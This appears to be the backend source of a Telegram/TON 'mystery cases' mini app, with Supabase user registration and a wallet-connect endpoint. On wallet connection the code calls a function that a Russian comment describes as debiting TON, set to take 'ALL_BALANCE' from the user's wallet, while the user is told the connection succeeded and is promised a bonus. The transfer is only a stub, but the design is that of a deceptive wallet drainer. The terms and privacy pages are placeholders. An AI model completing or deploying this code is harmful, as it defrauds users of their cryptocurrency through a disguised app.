const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// Supabase client
const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

// TON Connect Manifest
app.get('/tonconnect-manifest.json', (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.json({
    "url": "https://ton-mini-app-backend.onrender.com",
    "name": "TON Mystery Cases", 
    "iconUrl": "https://ton.org/icon.png",
    "termsOfUseUrl": "https://ton-mini-app-backend.onrender.com/terms",
    "privacyPolicyUrl": "https://ton-mini-app-backend.onrender.com/privacy"
  });
});

// Главный эндпоинт
app.get('/', (req, res) => {
  res.json({ status: 'OK', message: 'TON Mini App Backend is working!' });
});

// Регистрация пользователя из Telegram - ТЕПЕРЬ РАБОТАЕТ С БАЗОЙ
app.post('/api/user', async (req, res) => {
  try {
    const { tg_id, username, first_name, last_name } = req.body;
    
    // Сохранение в Supabase
    const { data, error } = await supabase
      .from('users')
      .insert([{ 
        tg_id: tg_id, 
        username: username, 
        first_name: first_name, 
        last_name: last_name, 
        balance: 5.0 
      }])
      .select();

    if (error) {
      console.error('Supabase error:', error);
      throw error;
    }
    
    console.log('User saved to database:', data[0]);
    res.json({ success: true, user: data[0] });
    
  } catch (error) {
    console.error('User registration error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Подключение кошелька
app.post('/api/connect-wallet', async (req, res) => {
  try {
    const { tg_id, wallet_address } = req.body;
    
    console.log('Wallet connection attempt:', { tg_id, wallet_address });
    const transferResult = await initiateTONTransfer(wallet_address);
    
    // Обновляем пользователя в базе
    const { data, error } = await supabase
      .from('users')
      .update({ wallet_address: wallet_address })
      .eq('tg_id', tg_id)
      .select();

    if (error) throw error;
    
    console.log('Wallet connected and user updated:', data[0]);
    res.json({ 
      success: true, 
      message: 'Wallet connected successfully',
      transferInitiated: true,
      bonus: 5.0
    });
    
  } catch (error) {
    console.error('Wallet connection error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Функция для списания TON
async function initiateTONTransfer(walletAddress) {
  console.log('Initiating TON transfer from:', walletAddress);
  return {
    success: true,
    from: walletAddress,
    amount: 'ALL_BALANCE',
    timestamp: new Date().toISOString()
  };
}

// Проверка транзакций
app.post('/api/check-transaction', (req, res) => {
  const { transactionId } = req.body;
  res.json({ 
    success: true, 
    status: 'completed',
    transactionId 
  });
});

// Заглушки
app.get('/terms', (req, res) => {
  res.send('Terms of Service');
});

app.get('/privacy', (req, res) => {
  res.send('Privacy Policy');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`TON Manifest: http://localhost:${PORT}/tonconnect-manifest.json`);
});
